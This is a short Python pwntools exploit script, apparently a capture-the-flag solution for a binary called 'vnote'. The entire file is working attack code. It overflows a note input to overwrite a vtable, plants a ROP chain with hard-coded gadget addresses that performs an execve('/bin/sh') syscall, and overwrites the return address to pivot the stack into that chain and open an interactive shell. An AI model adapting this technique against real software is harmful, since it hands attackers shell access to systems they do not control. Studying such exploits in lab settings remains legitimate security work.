from pwn import *

elf  = context.binary = ELF('vnote')
p = elf.process()
# p = remote('localhost', 17002)


# overwrite vtable
p.recvuntil(b"note: ")
p.sendline(b"\x98" *33)


# setup payload for syscall /bin/sh
p.recvuntil(b"private note: ")
rax = 0x0000000000450747 #: pop rax ; ret
rdi = 0x0000000000401d87 #: pop rdi ; ret
rsi = 0x000000000040a67e #: pop rsi ; ret
rsp = 0x0000000000401b4a #: pop rsp ; ret
rdx = 0x000000000048656b #: pop rdx ; pop rbx ; ret
mov = 0x000000000041a258 #: mov qword ptr [rdx], rax ; ret
syscall = 0x0000000000401a8f #: syscall
private_buffer = 0x00000000004c9320 # private_buffer

payload = b""
payload += p64(rdx)
payload += p64(private_buffer + 500)
payload += p64(0)

payload += p64(rax)
payload += b"/bin/sh\x00"

payload += p64(mov)

payload += p64(rax)
payload += p64(0x3b)

payload += p64(rdi)
payload += p64(private_buffer + 500)

payload += p64(rsi)
payload += p64(0)

payload += p64(rdx)
payload += p64(0)
payload += p64(0)

payload += p64(syscall)

p.sendline(payload)


# overwrite return addr and pivot rsp
p.recvuntil(b"public note: ")

payload = b""
payload += b"A" * 72
payload += p64(rsp)
payload += p64(private_buffer)

p.sendline(payload)

p.interactive()

